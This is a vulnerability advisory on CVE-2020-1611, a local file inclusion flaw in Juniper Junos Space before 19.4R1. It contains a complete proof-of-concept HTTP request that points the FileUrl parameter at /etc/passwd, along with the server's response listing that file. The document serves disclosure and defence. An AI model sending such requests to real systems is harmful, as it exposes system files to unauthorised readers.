---
title: Juniper Junos Space Local File Inclusion Vulnerability
description: Juniper Junos Space prior to 19.4R1 Local File Inclusion Vulnerability
header: Juniper Junos Space prior to 19.4R1 Local File Inclusion Vulnerability
tags: ['advisories']
cwes: ['External Control of File Name or Path (CWE-73)']
affected_product: 'Juniper Networks Junos Space '
vulnerability_release_date: '2020-01-15'
---
A Local File Inclusion vulnerability (CVE-2020-1611) in Juniper Networks Junos Space allows an attacker to view all files on the target when the device receives malicious HTTP packets.

<!--more-->

## Juniper Junos Space Local File Inclusion
Juniper Junos Space prior to 19.4R1 is vulnerable to a local file inclusion vulnerability. An attacker with normal user rights could exploit this vulnerability.

The "Download Report" function is vulnerable.

Base Score: 6.5<br />
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

Links:

 - https://nvd.nist.gov/vuln/detail/CVE-2020-1611
 - https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10993

### Example

GET Parameters:

 - Set "Format" to "txt"
 - Set "FileUrl" to a local path

Request:<br />

```http
GET /mainui/download?X-CSRF=Y581SFvKU5INQPItBUoNj4NKf4IuqjSyywfRylPN3GLYaML3fM074gV2AIPBQjHEJsuJ9d7
&type=downloadGROpenReport&_browserId=1553107455361
&FileUrl=/etc/passwd&Format=txt&nodeHost=space-000311c3b873 HTTP/1.1
Host: 10.10.10.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.10/mainui/nLegacy.jsp?bid=1553107455361&appName=CMP
DNT: 1
Connection: close
Cookie: ext-$sidebar_gettingStarted_checkbox=o%3Achecked%3Db%253A0;
DWRSESSIONID=sicWsVGWEjxdNYR7RJ60rCtbBrOmy0JHBm4h;
JSESSIONID="aoVrgUa7V1prIWVO5KEmCqF6QGuuYZ44RshRxEYHAJXqQDCNBjV6pLKiaaXQx2jWjGWw5TxnDxkKtsi
_.space-000311c3b873:server3";
JSESSIONIDSSO=Cm5qb87syONJ2lku1dadTx-SVyaoy0k9lt-bwSnTkfFrdONVfvmzrxB+g8xny4gjyKk_;
X-CSRF=Y581SFvKU5INQPItBUoNj4NKf4IuqjSyywfRylPN3GLYaML3fM074gV2AIPBQjHEJsuJ9d7; JxRunningBids=_1553107455361_
``` 

<br />Response:<br />

```http
HTTP/1.1 200 OK
Date: Wed, 24 Apr 2019 13:32:31 GMT
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Pragma: No-cache
Cache-Control: no-cache,no-store,must-revalidate,private
Expires: Thu, 01 Jan 1970 00:00:00 UTC
Content-Disposition: attachment; filename="passwd"
Content-Type: application/octet-stream
Content-Length: 1345
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:2:2:daemon:/sbin:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
mysql:x:499:499:MySQL server:/var/lib/mysql:/sbin/nologin
cassandra:x:498:498::/var/lib/cassandra:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
gluster:x:497:497:GlusterFS daemons:/var/run/gluster:/sbin/nologin
jboss:x:500:500::/usr/local/jboss:/bin/bash
apache:x:48:48:Apache:/var/www:/sbin/nologin
saslauth:x:496:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
unbound:x:495:495:Unbound DNS resolver:/etc/unbound:/sbin/nologin
redis:x:494:494:Redis Server:/var/lib/redis:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
slipstream:x:493:493::/usr/local//slipstream/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74::/var/empty/sshd:/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
pcap:x:77:77:::/sbin/nologin
opennms:x:503:504::/home/opennms:/bin/bash
cassandr:x:504:505::/home/cassandr:/bin/bash
```
<br />
**Michael Wollner** ([@Ibonok](https://github.com/Ibonok))
